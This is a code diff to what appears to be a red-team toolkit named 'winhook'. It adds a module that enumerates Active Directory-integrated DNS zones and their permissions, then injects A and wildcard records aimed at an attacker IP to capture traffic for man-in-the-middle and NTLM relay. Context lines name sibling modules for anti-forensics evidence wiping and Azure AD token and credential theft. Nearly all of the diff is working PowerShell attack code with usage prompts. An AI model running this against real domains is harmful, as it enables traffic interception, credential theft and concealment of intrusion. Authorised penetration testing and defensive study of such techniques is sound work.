@@ -552,6 +552,11 @@ const PROGRAMS = {
       "Anti-forensics toolkit — timestamp stomping (modify file Created/Modified/Accessed times to blend with legitimate files), prefetch and amcache clearing (remove execution evidence), USN journal manipulation (delete change tracking records), shimcache clearing, and recent docs/jump list cleanup. Covers the major forensic artifact categories that IR teams examine",
     args: "--action stomp|prefetch|amcache|usn|shimcache|recent|full [--target PATH] [--timestamp 'YYYY-MM-DD HH:mm:ss'] [--reference PATH]",
   },
+  adidns_poison: {
+    description:
+      "AD-integrated DNS poisoning — inject, modify, or delete DNS records in Active Directory-integrated DNS zones for man-in-the-middle attacks. Enumerate zones and record permissions, add wildcard records to capture all unresolved queries, inject A records pointing to attacker IP, check ADIDNS default permissions (Authenticated Users can create records by default). Complements responder_poison for targeted MITM",
+    args: "--action enum|inject|wildcard|delete|check-perms [--zone ZONE] [--name RECORD] [--ip IP] [--type A|CNAME|TXT]",
+  },
   azure_ad_hybrid: {
     description:
       "Azure AD / Entra ID hybrid attack toolkit — extract Primary Refresh Tokens (PRT) for cloud session hijacking, dump Azure AD Connect credentials (sync account password hash), extract Seamless SSO Kerberos decryption key (AZUREADSSOACC$ computer account), enumerate hybrid join status, tenant info, and conditional access gaps. Critical for on-prem to cloud lateral movement in hybrid environments",
@@ -17640,6 +17645,269 @@ Write-Output "[*] Cleanup complete — recent activity evidence removed"
   return { output: output.join("\n"), findings }
 }
 
+async function adidnsPoison(args: string[], timeout: number): Promise<HookResult> {
+  const action = argVal(args, "--action") || "enum"
+  const zone = argVal(args, "--zone")
+  const name = argVal(args, "--name")
+  const ip = argVal(args, "--ip")
+  const recordType = argVal(args, "--type") || "A"
+  const findings: Finding[] = []
+  const output: string[] = ["[*] AD-integrated DNS poisoning toolkit...\n"]
+
+  if (action === "enum") {
+    const script = `
+Write-Output "=== ADIDNS Zone Enumeration ==="
+Write-Output ""
+$domain = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
+$dnsRoot = "DC=DomainDnsZones,DC=$($domain.Name.Replace('.',',DC='))"
+Write-Output "Domain: $($domain.Name)"
+Write-Output "DNS Root: $dnsRoot"
+Write-Output ""
+# Enumerate DNS zones
+$searcher = New-Object DirectoryServices.DirectorySearcher
+$searcher.SearchRoot = [ADSI]"LDAP://CN=MicrosoftDNS,$dnsRoot"
+$searcher.Filter = "(objectClass=dnsZone)"
+$zones = $searcher.FindAll()
+Write-Output "=== DNS Zones ==="
+foreach ($z in $zones) {
+  $zoneName = $z.Properties["name"][0]
+  Write-Output "  Zone: $zoneName"
+}
+Write-Output ""
+# Enumerate records in primary zone
+$primaryZone = ${zone ? `'${zone}'` : '$domain.Name'}
+Write-Output "=== Records in $primaryZone ==="
+$searcher.SearchRoot = [ADSI]"LDAP://DC=$primaryZone,CN=MicrosoftDNS,$dnsRoot"
+$searcher.Filter = "(objectClass=dnsNode)"
+$searcher.PageSize = 1000
+$records = $searcher.FindAll()
+Write-Output "Total DNS nodes: $($records.Count)"
+Write-Output ""
+# Look for interesting records
+$wildcardExists = $false
+foreach ($r in ($records | Select-Object -First 100)) {
+  $rName = $r.Properties["name"][0]
+  if ($rName -eq "*") { $wildcardExists = $true }
+  if ($rName -match 'wpad|isatap|\*|proxy|vpn|mail|owa|autodiscover') {
+    Write-Output "  [!] $rName"
+  }
+}
+if (-not $wildcardExists) {
+  Write-Output ""
+  Write-Output "[!] No wildcard (*) record exists — wildcard injection possible"
+  Write-Output "    Use: winhook adidns_poison --action wildcard --ip ATTACKER_IP"
+}
+`
+    const r = await ps(script, timeout)
+    output.push(r.stdout)
+    if (r.stdout.includes("wildcard injection possible")) {
+      findings.push({
+        checkId: "ADIDNS-001",
+        provider: "winhook",
+        severity: "high",
+        status: "FAIL",
+        resource: "ADIDNS",
+        title: "No wildcard DNS record — injection possible for MITM",
+        details: "Authenticated users can create ADIDNS records by default, including wildcard entries",
+        remediation: "Create a static wildcard record, restrict CreateChild on MicrosoftDNS container.",
+      })
+    }
+  }
+
+  if (action === "check-perms") {
+    const script = `
+Write-Output "=== ADIDNS Permission Check ==="
+Write-Output ""
+$domain = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
+$dnsRoot = "DC=DomainDnsZones,DC=$($domain.Name.Replace('.',',DC='))"
+$primaryZone = ${zone ? `'${zone}'` : '$domain.Name'}
+$zoneDN = "DC=$primaryZone,CN=MicrosoftDNS,$dnsRoot"
+Write-Output "Checking: $zoneDN"
+Write-Output ""
+$zoneObj = [ADSI]"LDAP://$zoneDN"
+$acl = $zoneObj.ObjectSecurity
+Write-Output "=== Zone ACL ==="
+$dangerousPerms = @()
+foreach ($ace in $acl.Access) {
+  $principal = $ace.IdentityReference.Value
+  $rights = $ace.ActiveDirectoryRights
+  $accessType = $ace.AccessControlType
+  if ($principal -match 'Authenticated Users|Everyone|Domain Users|Domain Computers' -and $rights -match 'CreateChild|GenericAll|GenericWrite') {
+    Write-Output "[!] DANGEROUS: $principal has $rights ($accessType)"
+    $dangerousPerms += "$principal : $rights"
+  }
+}
+if ($dangerousPerms.Count -gt 0) {
+  Write-Output ""
+  Write-Output "STATUS: $($dangerousPerms.Count) dangerous permission(s) found"
+  Write-Output "Any authenticated user can create DNS records in this zone"
+  Write-Output ""
+  Write-Output "Attack vectors:"
+  Write-Output "  1. Wildcard record — capture all unresolved DNS queries"
+  Write-Output "  2. WPAD record — proxy configuration poisoning"
+  Write-Output "  3. Clone existing hostname — redirect traffic to attacker"
+} else {
+  Write-Output "STATUS: Zone permissions appear restricted"
+}
+`
+    const r = await ps(script, timeout)
+    output.push(r.stdout)
+    if (r.stdout.includes("DANGEROUS:")) {
+      findings.push({
+        checkId: "ADIDNS-002",
+        provider: "winhook",
+        severity: "high",
+        status: "FAIL",
+        resource: "ADIDNS Zone Permissions",
+        title: "Authenticated Users can create DNS records — poisoning possible",
+        details: r.stdout.substring(r.stdout.indexOf("DANGEROUS:"), r.stdout.indexOf("DANGEROUS:") + 200),
+        remediation: "Remove CreateChild from Authenticated Users on DNS zone objects.",
+      })
+    }
+  }
+
+  if (action === "inject") {
+    if (!name || !ip) {
+      output.push("ERROR: --name and --ip required for inject action")
+      output.push("Usage: winhook adidns_poison --action inject --name target --ip 10.0.0.1")
+      return { output: output.join("\n"), findings }
+    }
+    const script = `
+Write-Output "=== ADIDNS Record Injection ==="
+Write-Output "Record: ${name}"
+Write-Output "IP: ${ip}"
+Write-Output "Type: ${recordType}"
+Write-Output ""
+$domain = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
+$dnsRoot = "DC=DomainDnsZones,DC=$($domain.Name.Replace('.',',DC='))"
+$primaryZone = ${zone ? `'${zone}'` : '$domain.Name'}
+$zoneDN = "DC=$primaryZone,CN=MicrosoftDNS,$dnsRoot"
+# Check if record already exists
+$existingDN = "DC=${name},$zoneDN"
+$existing = [ADSI]"LDAP://$existingDN"
+if ($existing.Name) {
+  Write-Output "[!] Record '${name}' already exists — cannot overwrite (only owner can modify)"
+  Write-Output "    Use --action delete first if you own it, or choose a different name"
+  return
+}
+# Create DNS record via LDAP
+try {
+  $zoneObj = [ADSI]"LDAP://$zoneDN"
+  $record = $zoneObj.Create("dnsNode", "DC=${name}")
+  # Build DNS record binary data for A record
+  $ipParts = '${ip}'.Split('.')
+  $recordData = [byte[]]@(
+    0x04, 0x00,       # DataLength = 4
+    0x01, 0x00,       # Type = A (0x0001)
+    0x05, 0x00, 0x00, 0x00,  # Version = 5
+    0x00, 0x00, 0x00, 0x00,  # Rank = 0
+    0x00, 0x00,       # Flags
+    0x00, 0x00, 0x00, 0x00,  # Serial
+    0x00, 0x00, 0x00, 0x00,  # TtlSeconds = 900
+    0x84, 0x03, 0x00, 0x00,  # 900 in LE
+    0x00, 0x00, 0x00, 0x00,  # Reserved
+    0x00, 0x00, 0x00, 0x00,  # Timestamp
+    [byte]$ipParts[0], [byte]$ipParts[1], [byte]$ipParts[2], [byte]$ipParts[3]
+  )
+  $record.Put("dnsRecord", $recordData)
+  $record.Put("dNSTombstoned", $false)
+  $record.SetInfo()
+  Write-Output "[+] SUCCESS: DNS record created"
+  Write-Output "    ${name}.$primaryZone -> ${ip}"
+  Write-Output ""
+  Write-Output "Verification: nslookup ${name}.$primaryZone"
+  Write-Output "Cleanup: winhook adidns_poison --action delete --name ${name}"
+} catch {
+  Write-Output "[-] FAILED: $_"
+  Write-Output "    You may not have CreateChild permission on this zone"
+}
+`
+    const r = await ps(script, timeout)
+    output.push(r.stdout)
+    if (r.stdout.includes("SUCCESS")) {
+      findings.push({
+        checkId: "ADIDNS-003",
+        provider: "winhook",
+        severity: "critical",
+        status: "FAIL",
+        resource: `${name}.${zone || "domain"}`,
+        title: `DNS record injected: ${name} -> ${ip}`,
+        details: "ADIDNS record created via LDAP — traffic to this name will be redirected",
+        remediation: "Delete the injected record, restrict ADIDNS permissions.",
+      })
+    }
+  }
+
+  if (action === "wildcard") {
+    if (!ip) {
+      output.push("ERROR: --ip required for wildcard action")
+      return { output: output.join("\n"), findings }
+    }
+    const script = `
+Write-Output "=== ADIDNS Wildcard Record Injection ==="
+Write-Output "Wildcard: *.zone -> ${ip}"
+Write-Output ""
+Write-Output "A wildcard record captures ALL unresolved DNS queries in the zone"
+Write-Output "This is the ADIDNS equivalent of LLMNR/NBT-NS poisoning"
+Write-Output ""
+$domain = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
+$dnsRoot = "DC=DomainDnsZones,DC=$($domain.Name.Replace('.',',DC='))"
+$primaryZone = ${zone ? `'${zone}'` : '$domain.Name'}
+$zoneDN = "DC=$primaryZone,CN=MicrosoftDNS,$dnsRoot"
+try {
+  $zoneObj = [ADSI]"LDAP://$zoneDN"
+  $record = $zoneObj.Create("dnsNode", "DC=*")
+  $ipParts = '${ip}'.Split('.')
+  $recordData = [byte[]]@(
+    0x04, 0x00, 0x01, 0x00, 0x05, 0x00, 0x00, 0x00,
+    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
+    0x00, 0x00, 0x00, 0x00, 0x84, 0x03, 0x00, 0x00,
+    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
+    [byte]$ipParts[0], [byte]$ipParts[1], [byte]$ipParts[2], [byte]$ipParts[3]
+  )
+  $record.Put("dnsRecord", $recordData)
+  $record.Put("dNSTombstoned", $false)
+  $record.SetInfo()
+  Write-Output "[+] SUCCESS: Wildcard record created"
+  Write-Output "    *.$primaryZone -> ${ip}"
+  Write-Output ""
+  Write-Output "All unresolved queries in the zone now resolve to ${ip}"
+  Write-Output "Set up listener: winhook ntlm_relay --action relay --relay-to TARGET"
+  Write-Output "Cleanup: winhook adidns_poison --action delete --name '*'"
+} catch {
+  Write-Output "[-] FAILED: $_"
+}
+`
+    const r = await ps(script, timeout)
+    output.push(r.stdout)
+  }
+
+  if (action === "delete") {
+    if (!name) {
+      output.push("ERROR: --name required for delete action")
+      return { output: output.join("\n"), findings }
+    }
+    const script = `
+Write-Output "=== ADIDNS Record Deletion ==="
+$domain = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
+$dnsRoot = "DC=DomainDnsZones,DC=$($domain.Name.Replace('.',',DC='))"
+$primaryZone = ${zone ? `'${zone}'` : '$domain.Name'}
+$recordDN = "DC=${name},DC=$primaryZone,CN=MicrosoftDNS,$dnsRoot"
+try {
+  $record = [ADSI]"LDAP://$recordDN"
+  $record.DeleteTree()
+  Write-Output "[+] SUCCESS: Record '${name}' deleted from $primaryZone"
+} catch {
+  Write-Output "[-] FAILED: $_ (you can only delete records you created)"
+}
+`
+    const r = await ps(script, timeout)
+    output.push(r.stdout)
+  }
+
+  return { output: output.join("\n"), findings }
+}
+
 async function azureAdHybrid(args: string[], timeout: number): Promise<HookResult> {
   const action = argVal(args, "--action") || "enum"
   const tenant = argVal(args, "--tenant")
@@ -22487,6 +22755,7 @@ const dispatch: Record<Program, (args: string[], timeout: number) => Promise<Hoo
   ntlm_relay: ntlmRelay,
   responder_poison: responderPoison,
   azure_ad_hybrid: azureAdHybrid,
+  adidns_poison: adidnsPoison,
 }
 
 export const WinhookTool = Tool.define("winhook", {
